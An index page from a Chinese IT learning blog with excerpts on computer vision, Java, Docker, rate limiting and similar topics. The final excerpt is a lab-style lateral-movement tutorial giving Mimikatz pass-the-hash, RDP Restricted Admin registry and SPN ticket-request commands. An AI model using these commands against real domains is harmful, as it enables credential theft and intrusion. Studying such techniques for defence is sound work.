<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/852f34d3704928bde1770d2a16495690/" rel="bookmark">
			【计算机视觉】使用GrabCut算法進行前景檢測
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述： 计算视差图是分割图像前景和背景的有效方法。本次目标是抓住图像中的人物并丢弃背景。GradCut算法实现步骤：
1. 定義一個包含圖片主題的矩形。
2. 矩形以外的區域被自動定義為背景。
3. 背景中包含的數據作為參考，在用戶定義的矩形內區分背景區域和前景區域。
4. 高斯混合模型 (GMM) 對前景和背景進行建模，並將未定義的像素標記為可能的背景和可能的前景。
5. 圖像中的每個像素都通過虛擬邊緣虛擬連接到周圍的像素，並且每個邊緣被分配為前景或背景的概率，基於它與周圍像素的顏色相似程度。
6. 每個像素（或算法中概念化的節點）都連接到前景或背景節點。
7. 在節點連接到任一終端（背景或前景，也分別稱為源或匯）後，屬於不同終端的節點之間的邊被切割（因此得名 GrabCut）。 因此，圖像被分割成兩部分。
实现步骤： 首先，加載我們要處理的圖像，然後創建一個填充了零的掩碼其形狀與我們加載的圖相同
import numpy as np import cv2 from matplotlib import pyplot as plt original = cv2.imread('img/statue_small.jpeg') img = original.copy() mask = np.zeros(img.shape[:2],np.uint8) #create zero-filled background and foreground models #創建零填充的背景和前景模型 bgdModel = np.zeros((1,65),np.float64) fgdModel = np.zeros((1,65),np.float64) 使用一個矩形來初始化 GrabCut 算法，該矩形標識我們想要隔離的主題。 因此，背景和前景模型將根據初始矩形之外的區域來確定。
rect = (100,1,421,378) # 指定要用於初始化操作的空模型、掩碼和矩形 # 5-迭代次数 cv2.grabCut(img,mask,rect,bgdModel,fgdModel,5,cv2.GC_INIT_WITH_RECT) 為了可視化 GrabCut 的結果，我們希望將背景塗成黑色並保持前景不變。 我們可以製作另一個面具來幫助我們做到這一點。 值 0 和 2（明顯且可能的背景）將轉換為 0，值 1 和 3（明顯且可能是前景）將轉換為 1。 結果將存儲在 mask2 中。 我們將原始圖像乘以 mask2 以使背景變黑（乘以 0），同時保持前景不變（乘以 1）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/852f34d3704928bde1770d2a16495690/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0519eaa091684905de744e2730c8916/" rel="bookmark">
			秒杀项目之登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、技术点介绍
二、学习目标
三、如何设计一个秒杀系统
★ 四、项目环境搭建
1、 创建SpringBoot项目并配置POM
2、导入对应的pom依赖
3、导入数据库及表​
4、 配置application.yml
5、启动类中添加注解
6、使用Mybatis-plus反向生成代码
7、userMapper添加@Repository注解
五、前端构建
1、创建登录界面
3、在js目录下新建目录project
4、新建controller类
六、MD5加密
①、exception
②、response包
JsonResponseParse ：
JsonResponseResult ：
ResponseResult：
ResponseResultCode ：
RestThrowableAdvice ：
③、MD5Utils
ValidatorUtils :
2、新建vo类
3、登录方法：
IUserService层：
UserServiceImpl类：
UserController类：
七、 全局异常抓获
1、给实体类userVo加入注解
2、导入帮助包validate，异常抓获
IsMobile：
IsMobileValidator：
IsRequired：
IsRequiredValidator：
ThrowableAdvice：
3、在UserController类方法中加入注解
4、实现类抛出异常
一、技术点介绍 前端：Freemarker、LayUI、jQuery
后端：SpringBoot、MyBatisPlus、Lombok
中间件：RabbitMQ、Redis(redisson)
分布式协调框架：zookeeper
二、学习目标 1.安全优化：隐藏秒杀地址、验证码、接口限流
2.服务优化：RabbitMQ消息队列、接口优化、分布式锁
3.页面优化：缓存、静态化分离
4.分布式会话：用户登录、共享session
5.功能开发：商品列表、商品详情、秒杀、订单详情
6.系统压测：JMeter入门、自定义变量、压测
三、如何设计一个秒杀系统 秒杀，对我们来说，都不是一个陌生的东西。每年的双11,618以及时下流行的直播等等。
秒杀然而，这对于我们系统而言是一个巨大的考验。
那么，如何才能更好地理解秒杀呢？我觉得作为一个程序员，你首先要从高维度出发，从整体上思考问题。
在我看来，秒杀其实主要解决两个问题，一个是并发读，一个是并发写。并发读的核心优化理念是尽量减少用户
到服务端来“读”数据，或者让他们读更少的数据；并发写的处理原则也一样，他要求我们在数据库层面独立出来
一个库，做特殊的处理。另外，我们还要针对秒杀系统做一个保护，针对意料之外的情况设计兜底方案，以防止最坏
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0519eaa091684905de744e2730c8916/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5975ef1772338dbebcabc9c1231ed416/" rel="bookmark">
			【关于VMware安装后没有虚拟网卡VMnet1和VMnet8】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装VMware后通过 命令行命令 ipconfig/all 发现没有VMnet1和VMnet8 然后我首先尝试打开虚拟网络编辑器，然后点击还原默认设置 2.经过一段时间的等待后发现VMnet1和VMnet8的主机连接还是没有连接然后我点击将主机虚拟适配器连接到此网络 点击之后主机连接由 - 变成了已连接但是点击确认后再点开虚拟网络编辑器发现主机连接还是 “-”
之后只能重装VMware 重装之后发现还是没有VMnet1和VMnet8
3.解决方法CCleaner 首先卸载VMware 并且将C\ProgramData下的VMware文件夹删除掉
然后去网上下载一个 CCleaner
链接：CClear 软件
安装好CCleaner后，打开，按照图例操作
之后在安装VMware
安装后打开虚拟网络编辑器
结果如下图 即为成功安装
至此，问题成功解决！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edbda4a8fdea15fb3eda255ce8d49243/" rel="bookmark">
			AcWing 蓝桥杯C&#43;&#43; AB组辅导课学习记录（Python，备战蓝桥杯）Day31 - Day60
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		时间不够了，从20220221开始，周一到周五每天：2-4题，周末每天：4-8题。
Day 31 (2022.2.12)
# acwing 1224. 交换瓶子 if __name__ == '__main__': n = int(input()) arr = [0]+[int(x) for x in input().split()] st, cnt = [0]*(n+1), 0 for i in range(1,n+1): if not st[i]: cnt += 1 while not st[i]: st[i] = 1 i = arr[i] print(n-cnt) Day 32 (2022.2.13)
今天复习了下树状数组和线段树，然后油漆面积和三体攻击就没有认真研究了，感觉很有难度，可以先放一放。
# acwing 1228. 油漆面积 if __name__ == '__main__': n = int(input()) arr, x_max, y_max = [], 0, 0 for _ in range(n): square = [int(x) for x in input().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/edbda4a8fdea15fb3eda255ce8d49243/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51655b9bf0dbe17b5577ba167943ed51/" rel="bookmark">
			定义一个Document类，有数据成员name,从Document派生出Book类，增加数据成员pageCount。观察基类与派生类的构造函数和析构函数的调用顺序。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; class Document{ public: Document(string aname):name(aname){ cout &lt;&lt; "Constructing Document" &lt;&lt; endl; }	~Document(){ cout &lt;&lt; "Destructing Document" &lt;&lt; endl; } private: string name; }; class Book:public Document{ public: Book(string aname,int apageCount):Document(aname),pageCount(apageCount){ cout &lt;&lt; "Constructing Book" &lt;&lt; endl;} ~Book(){ cout &lt;&lt; "Destructing Book" &lt;&lt; endl; } private: int pageCount; }; int main() { Book a("朝花夕拾",200); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be1955875d6ee3104b776f486744b93c/" rel="bookmark">
			element ui Cascader select多选传值及反显
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		传值 后台需要接受的参数是数组格式
但是 Cascader点击事件返回的参数是id名的数组，无法获取label值，所以需要获取节点this.$refs.cascaderAddr.getCheckedNodes()[0].pathLabels,就可以获取到。
需要做出的效果图是这样的，所以我还需要获取层级字符串。我们二三级表单是通过动态加载获取的
获取到的this.$refs.cascaderAddr.getCheckedNodes()其中path和 pathLabels分别对应id和名字，我需要将键值对拼接一起，变成后端想要的格式。 在联级选择的点击事件中写。this.form.contentVOs就是我们最后想要的
因为选择一个人就会再输入一次区和部门的信息，所以需要数组去重
//数组去重 unique(arr) { for (var i = 0; i &lt; arr.length; i++) { for (var j = i + 1; j &lt; arr.length; j++) { if (arr[i].contentCode === arr[j].contentCode) { // 如果第一个等于第二个，splice方法删除第二个 arr.splice(j, 1) j-- } } } return arr }, // 获取部门及人员选择信息 cascaderFun(a) { this.selectPeopleList = this.$refs.cascaderAddr.getCheckedNodes() let obj = {} console.log('this.selectPeopleList', this.selectPeopleList) this.selectPeopleList.map(i =&gt; { // 人员部门键值对匹配组成对象 i.path.map((j, jIndex) =&gt; { i.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be1955875d6ee3104b776f486744b93c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a6dd733b3edea6ee131698f9a581ee9/" rel="bookmark">
			Spark/Spark-JobServer 执行SQL时任务超时
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 问题，SQL执行时超时 2022/03/18 17:36:47 HttpRequest GET http://10.1.170.115:8080/v1/statement/20220318_093646_03065_awf2q/2 map[errorClass:java.util.concurrent.TimeoutException message:Futures timed out after [600 seconds] stack:java.util.concurrent.TimeoutException: Futures timed out after [600 seconds] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:223) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:227) at scala.concurrent.Await$$anonfun$result$1.apply(package.scala:190) at akka.dispatch.MonitorableThreadFactory$AkkaForkJoinWorkerThread$$anon$3.block(ThreadPoolBuilder.scala:167) at akka.dispatch.forkjoin.ForkJoinPool.managedBlock(ForkJoinPool.java:3641) at akka.dispatch.MonitorableThreadFactory$AkkaForkJoinWorkerThread.blockOn(ThreadPoolBuilder.scala:165) at akka.dispatch.BatchingExecutor$BlockableBatch.blockOn(BatchingExecutor.scala:106) at scala.concurrent.Await$.result(package.scala:190) at spark.jobserver.WebApi.spark$jobserver$WebApi$$getJobManagerForContext(WebApi.scala:812) at spark.jobserver.WebApi$$anonfun$jobRoutes$1$$anonfun$apply$94$$anonfun$apply$95.apply(WebApi.scala:723) at spark.jobserver.WebApi$$anonfun$jobRoutes$1$$anonfun$apply$94$$anonfun$apply$95.apply(WebApi.scala:713) at spray.routing.ApplyConverterInstances$$anon$17$$anonfun$apply$6.apply(ApplyConverterInstances.scala:60) at spray.routing.ApplyConverterInstances$$anon$17$$anonfun$apply$6.apply(ApplyConverterInstances.scala:59) at spray.routing.ConjunctionMagnet$$anon$3$$anon$4$$anonfun$happly$1$$anonfun$apply$1.apply(Directive.scala:38) at spray.routing.ConjunctionMagnet$$anon$3$$anon$4$$anonfun$happly$1$$anonfun$apply$1.apply(Directive.scala:37) at spray.routing.directives.BasicDirectives$$anon$2.happly(BasicDirectives.scala:79) at spray.routing.Directive$$anon$7$$anonfun$happly$4.apply(Directive.scala:86) at spray.routing.Directive$$anon$7$$anonfun$happly$4.apply(Directive.scala:86) at spray.routing.directives.BasicDirectives$$anon$3$$anonfun$happly$1.apply(BasicDirectives.scala:92) at spray.routing.directives.BasicDirectives$$anon$3$$anonfun$happly$1.apply(BasicDirectives.scala:92) at spray.routing.directives.BasicDirectives$$anon$3$$anonfun$happly$1.apply(BasicDirectives.scala:92) at spray.routing.directives.BasicDirectives$$anon$3$$anonfun$happly$1.apply(BasicDirectives.scala:92) at spray.routing.directives.BasicDirectives$$anon$3$$anonfun$happly$1.apply(BasicDirectives.scala:92) at spray.routing.directives.BasicDirectives$$anon$3$$anonfun$happly$1.apply(BasicDirectives.scala:92) at spray.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a6dd733b3edea6ee131698f9a581ee9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80df33683d37a5227e6c2062c9b62039/" rel="bookmark">
			java printf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【简介】 printf System.out.printf() 是 Java 5 开始引入的，用法类似 C语言的 printf() 函数。 目录
【简介】
【API】
【附录：flags标志说明】
【附录：conversion转换符说明】
【附录：日期时间转换符说明】
【API】 ①PrintStream	printf(Locale l, String format, Object... args) 使用指定的格式字符串和参数将格式化的字符串写入此输出流的便利方法。 ②PrintStream	printf(String format, Object... args) 使用指定的格式字符串和参数将格式化的字符串写入此输出流的便利方法。 1.format 格式：%[argument_index$][flags][width][.precision]conversion
①argument_index：是十进制的整数，表示参数列表中第i个参数。 举例：System.out.printf("%1$s %2$tB %2$te, %2$tY","Due date:",new Date()); 说明：1$表示第一个参数，也就是"Due date:" ②flags：指定格式化输出外观的各种标志。 ③width：是十进制整数，表示输出的字符个数。 举例：double x=33.3; System.out.printf("%5.2f",x); 输出为：33.30 说明：对于浮点数，包含小数点所占的一个字符和符号所占的一个字符。当实际的字符数小于指定的宽度时，根据上个参数flags指定的标志进行填充，如未指定，默认为空格。 ④precision：是非负十进制整数，通常用于限制字符数。如上例。 ⑤conversion：(必须)是一个字符，指定格式化参数。 举例： @Test public void printfTest(){ // System.out.printf("%tc",new Date()); double x=19668889.999999; int y=-100; System.out.printf("%,9.2f",x);//19,668,890.00 System.out.println(); System.out.printf("%+9.2f",x);//+19668890.00 System.out.println(); System.out.printf("%(d",y);//(100) System.out.println(); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80df33683d37a5227e6c2062c9b62039/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa8f7b532d9781e0ae8a48e1de68fd53/" rel="bookmark">
			生物信息学分析 | 物种间的同源基因的批量注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目需求：现在以及大鼠的基因若干，想要转换成人类对应的同源基因的名及ID，怎么对应？
解决策略：（几行代码就可以快速解决，感谢R）
#安装好R包 install.packages("homologene") library(homologene) homologene::taxData #Rattus norvegicus:10116 #Homo sapiens:9606 ############################################################### setwd("E://") genes&lt;-read.csv("genes.csv") #输入数据集 #输入的可以是genesymbol名，也可以是ncbi的id transferdata&lt;-homologene(genes$gene.name,inTax = 10116,outTax = 9606) #转换后得到的是一个四列的矩阵 colnames(transferdata)[1]&lt;-"gene.name" data&lt;-merge(genes,transferdata,all.x = TRUE) #合并，取交集，也同时保留原始数据中未对应上的部分 write.csv(data,"humangene.csv",row.names = F) #写入文件中 在该R包使用过程中，一些经验：
（1）可能并不是所有的基因能够对应上，剩下的可能是数据库中没有，可以自己去NCBI的gene数据中手动一一注释。
（2）有时候小鼠转换到人基因名，似乎只是大小写的问题（这方面的经验未知）。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a42e6da0b90c65e202d6f2ed5d3edc2/" rel="bookmark">
			境外电商-香港汇丰银行基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、前言 在注册境外电商平台时，一般需要境外企业对公银行账号。 香港汇丰银行的账号与中国的银行账号有 天壤之别，且在填写资料时， 非常容易填写错，坑比较多。 银行代码: 004分行代码: 040 香港公司名称：xxxxx LIMITED汇丰银行账号：040-123456-838The bank Code of HSBC Hong Kong is 004 Swift address is HSBC HKHH HKHThe address of HSBC Hong Kong Main Office is HSBC Main Building, 1 Queen’s Road Central, Hong Kong银行名称: The Hongkong and Shanghai Banking Corporation Limited 二、香港汇丰银行企业对公账户 香港上海汇丰银行有限公司的银行代码: 004国际汇款代码为：HSBCHKHHXXX， 其含义是：
HSBC=银行编码HK=国家编码HH=地区编码HKH=分行编码最后3个XXX代表该银行总部，参考你所持有的账户即可查看到分行编号 香港汇丰的账户号码长度是 10或12个数字 。 分行编号是首3个数字 ， 随后的7至9个数字是账户号码 余下的组合。您可通过网上理财或流动理财应用程式丶联络客户服务热线或本行任何分行查询账户详情。 三、银行账号示例说明 如：香港汇丰银行账号124-123456-838这种12位的怎么区分银行代码和分行代码
124 是 分行代码 123456 是 账号 838 是 账户类型 还有一个 004 是 银行代码 不在银行账号内 就是汇丰银行的代码 四、汇丰银行的回执函 非常非常重要的凭证，注册相关支付需要用到这些资料信息 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/059dae357cb5f83f6e646e16a552aa39/" rel="bookmark">
			pip 在c盘的文件路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pip 安装包时会在c盘留下索引文件，时间久了会越来越大。 具体文件位置为：C:\Users\Administrator\AppData\Local\pip\cache\http
但是不确定pip 库安装好后将相应的文件删除之后是否会产生影响。
经过测试后好像是没有影响
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b1bbd38152d9adb425142d729fdad3f/" rel="bookmark">
			超全面python常见报错以及解决方案梳理必收藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用python难免会出现各种各样的报错，以下是Python常见的报错以及解决方法（持续更新），快进入收藏吃灰吧。编程学习资料点击领取
AttribteError: ‘module' object has no attribute xxx'
描述:模块没有相关属性。可能出现的原因:
1.命名.py文件时，使用了Python保留字或者与模块名等相同。
解决:修改文件名
2.pyc文件中缓存了没有更新的代码。
解决:删除该库的.pyc 文件
AttributeError: ‘Obj' object has no attribute ‘attr'
描述:对象没有相关属性。可能出现的原因:
1.Python内置对象没有属性。
解决:去除相关访问
2.Python自定义对象没有设置属性。
解决:在自定义对象中添加属性
3.通过类名访问实例属性。
解决:修改为通过实例名访问
FileExistsError: [Errmo 17] File exists
描述:文件已经存在。
解决:先判断文件是否存在，如果已经存在，则不再重新创建
FileNotFoundError: [Ermo 2] No such file or directory
描述:请求的文件或目录不存在。
解决:检查文件或目录的路径是否正确
IndentationError: expected an indented block
描述:期望一个缩进块。可能出现的原因:
1.定义函数或者类下的结构体时没有缩进。
解决:添加缩进
2.if或者for或者while语句下的结构体没有缩进。
解决:添加缩进
IndentationError: unexpected indent
描述:缩进错误。可能出现的原因:
代码 前面出现除缩进以外的空格。
解决:删除多余的空格
IndentationError: unindent does not match any outer indentation level
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b1bbd38152d9adb425142d729fdad3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/368d1db8f29d7ecde66a55afc8a9fbf2/" rel="bookmark">
			docker网络方面简单配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何在docke容器中查看ip地址，有哪些方式？
容器内：
1、安装net-tools包
2、hostname -i 或者 hostname -I
3、cat /etc/hosts
容器外：
1、docker inspect ID -f ‘{{ .NetworkSettings.IPAddress }}’
2、简单点：docker inspect ID | grep ‘IPAddress’
如何给docker容器配置DNS
1、进入容器，修改/etc/resolv.conf文件
2、docker run --dns=223.5.5.5
3、修改docker的配置文件，/etc/docker/daemon.json文件
如何给docker容器配置主机名 172.17.0.2
1、通过–hostname指定主机名，docker run --hostname MyLinux(重启创建时设置)
2、直接进入容器里面改hosts文件(重启一下才会生效)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d45d6a03325408ee633da1f8bfc2d8b8/" rel="bookmark">
			常见的限流算法分析以及手写实现（计数器、漏斗、令牌桶）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常见的限流算法分析🥂 为什么要限流👀 👩🏻‍🏫在保证可用的情况下尽可能多增加进入的人数,其余的人在排队等待,或者返回友好提示,保证里面的进行系统的用户可以正常使用，防止系统雪崩。
限流算法🌴🌴 限流算法很多,常见的有三类,分别是 计数器算法 、漏桶算法、令牌桶算法 。
（1）计数器：
在一段时间间隔内，处理请求的最大数量固定，超过部分不做处理。
（2）漏桶：
漏桶大小固定，处理速度固定，但请求进入速度不固定（在突发情况请求过多时，会丢弃过多的请求）。
（3）令牌桶：
令牌桶的大小固定，令牌的产生速度固定，但是消耗令牌（即请求）速度不固定（可以应对一些某些时间请求过多的情况）；每个请求都会从令牌桶中取出令牌，如果没有令牌则丢弃该次请求。
计数器限流✨ 🍺在一段时间间隔内，处理请求的最大数量固定，超过部分不做处理。
举个🌰,比如我们规定对于A接口，我们1分钟的访问次数不能超过100次。
那么我们可以这么做：
🎈在一开 始的时候，我们可以设置一个计数器counter，每当一个请求过来的时候，counter就加1，如果counter的值大于100并且该请求与第一个请求的间隔时间还在1分钟之内，那么说明请求数过多,拒绝访问；
🍬如果该请求与第一个请求的间隔时间大于1分钟，且counter的值还在限流范围内，那么就重置 counter,就是这么简单粗暴。
代码实现： 😎
import java.util.concurrent.CountDownLatch; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.atomic.AtomicInteger; import java.util.concurrent.atomic.AtomicLong; //计数器 限流 public class CounterLimiter { //起始时间 private static long startTime = System.currentTimeMillis(); //时间间隔1000ms private static long interval = 1000; //每个时间间隔内，限制数量 private static long limit = 3; //累加器 private static AtomicLong accumulator = new AtomicLong(); /** * true 代表放行，请求可已通过 * false 代表限制，不让请求通过 */ public static boolean tryAcquire() { long nowTime = System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d45d6a03325408ee633da1f8bfc2d8b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/800375dad409d8e37aa9c61a593f8be7/" rel="bookmark">
			史上最拉跨的导线平差程序（ by C#）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		史上最拉跨的导线平差程序 文章简介使用介绍1.导入数据1.1 文件示例1.2 导入过程 2.选择观测角类型3.选择平差类型4.得到平差结果5.导线的粗差探测 总结更新 文章简介 此文章承接上文附和导线平差程序（by C#）的基础，基于C#窗体程序开发环境建立应用程序，可进行附和导线、闭合导线、支导线平差计算及导线测量中粗差的探测，程序已上传至导线平差程序（by C#），以供有兴趣的朋友参考学习，在此主要介绍程序的使用方法。
使用介绍 介绍程序使用方法，首先必须是介绍界面啦。
这朴实无华的界面称之为史上最拉跨不为过吧，哈哈哈。
接下来就要正经介绍其使用方法啦。
1.导入数据 这里需要导入三类数据，分别是点类，角类，长度类，三类数据均采用.txt文本文件存放。
1.1 文件示例 点类
点类存放已知控制点的坐标，具体存放哪些控制点针对不同平差类型会有所区别，会在下文介绍。数据使用逗号进行分割，第一列为点名，第二列为点的X坐标，第三列为点的Y坐标。角类
角类存放观测角数据，按照导线计算表中观测角填写数据进行记录。数据使用逗号进行分割，第一列为°，第二列为′，第三列为″。长度类
长度类存放观测边的长度，按照导线计算表中水平距离填写数据进行记录。单列记录。 1.2 导入过程 首先点击“浏览”，弹出选择文件的对话框，选择对应的数据文件，点击“读取”在文本框中会显示读取的内容，至此完成数据的导入。
2.选择观测角类型 这里将观测角分为“左角”和“右角”，可能还有别的称呼入“内角”和“外角”，这里为了方便一律记为“左角”和“右角”。
观测角类型：
左角
观测角在导线前进方向左侧。右角
观测角在导线前进方向右侧。 根据情况点击“观测角类型”下的方框，完成观测角类型的选择。
3.选择平差类型 这里不同的平差类型对点类数据有不同的要求。
附和导线
附和导线需要四个已知控制点，依次是始边的两个控制点和终边的两个控制点。闭合导线
闭合导线需要两个已知控制点，即始边的两个控制点。支导线
支导线同样只需要两个已知控制点，即始边的两个控制点。 4.得到平差结果 点击“平差”，平差结果会显示在对应的文本框中，可以导出（此功能目前只考虑导出为.txt文件格式）。
5.导线的粗差探测 进行附和导线和闭合导线平差时，可进行导线的粗差探测。
在得到平差结果后，如果平差结果显示“不符合限差”时，点击“粗差探测”，在对应文本框中会得到粗差探测结果，如果平差结果显示“符合限差”时，点击“粗差探测”，在对应文本框中会得到“符合限差无需进行粗差探测”。
总结 此导线平差程序是本人第一次基于C#窗体程序开发环境建立的应用程序，由于缺乏经验以及缺少测试数据，程序存在以下问题：
程序中存在过多“重复建设”的问题，使得部分代码重复出现多次。程序满足设计时的逻辑，但未经测试，可能很多问题并没有暴漏出来，也更谈不上解决了。程序对输入格式的要求比较固定，个人想法还是希望此程序能在未来工作中有使用的机会，对于一些计算题的解题不太友好。程序的界面比较“朴素”，有待提高。 更新 很久之前的东西了，现在已经不太记得了，但发现在CSDN下载是真的不便，就还是改到网盘上会好点。
网盘链接
提取码：c6w8
在此祝各位学有所成，身体健康。（20220317）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d81969e94ec4099ea014dd2a2ef4e44b/" rel="bookmark">
			【abp项目发布到iis（初学者）】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		abp项目发布到iis（vs2022） 右击发布的项目–发布–选择要发布的目标文件夹–发布
发布成功–打开iis
右击网站–添加网站
网站名称最好填项目名称，应用程序池注意不可多个使用，物理路径填前面发布文件夹的地址，ip地址填本机ip，端口号不能为80
点击确定
右击发布的文件夹–属性–安全–编辑–添加–高级
添加上这三个，打开iis
配置一下默认文档就ok了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef9fc327b5dd40564c7e40823b77e3fb/" rel="bookmark">
			安装了SDK但仍然报错 “找不到Windows SDK 版本xxxxxxxx。”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 问题描述：
VS2017、2019运行报如下错（通过右键项目--属性--更改SDK版本也解决不了这个问题）
通过VS installer重新安装SDK如下显示，且更改后依旧解决不了问题。
2. 问题原因：卸载VS没有清空卸载残留，再次安装运行即会报错，而不是SDK安装或者版本或者软件配置的问题。
3. 解决方案：
网上有人说重装系统，简单粗暴，但实际上大可不必。
最佳解决方案只需要清除卸载残留，删除文件，删除注册列表并重新安装即可。详情见如下博客：
http://t.csdn.cn/mNLGO
除以上我还在控制面板处将原来版本的VS、SDK也卸载清理干净了。
4. 按照上述步骤清理完成后，只需下载VS，重新安装就行了。
vs2017、2019安装包下载地址：
Downloads - Visual Studio Subscriptions Portal
齐活：
5. 总结：
非逼不得以，不要手欠乱卸载软件，也不要多次安装卸载同一个软件。卸载软件要注意把残留删除干净。否则清除不掉的垃圾就会堆积在你的电脑里，早晚出问题！
由于这次经历过于苦逼，写此博客留以纪念。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cf737db7de2038c0ea8d1b83932bacc/" rel="bookmark">
			内网安全-域横向CobaltStrike&amp;SPN&amp;RDP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		案例1-域横向移动RDP传递-Mimikatz 除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作。
RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断
当得到密码时，如果对方开启了3389端口，可以直接进行连接并登陆
RDP明文密码链接 1.windows: mstsc 2.mstsc.exe /console /v:192.168.3.21 /admin 3.linux: rdesktop 192.168.3.21:3389 RDP密文HASH链接 windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启， 同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持； 开启命令： REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f 开启后运行： 1.mstsc.exe /restrictedadmin 2.mimikatz.exe 3.privilege::debug 4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 "/run:mstsc.exe /restrictedadmin" 案例2-域横向移动SPN服务-探针,请求,导出,破解,重写 1探针 setspn -q */* setspn -q */* | findstr "MSSQL" 2请求票据 # 删除缓存票据 klist purge # powershell请求 Add-Type -AssemblyName System.
	</div>
	<div class="list__footer clearfix">
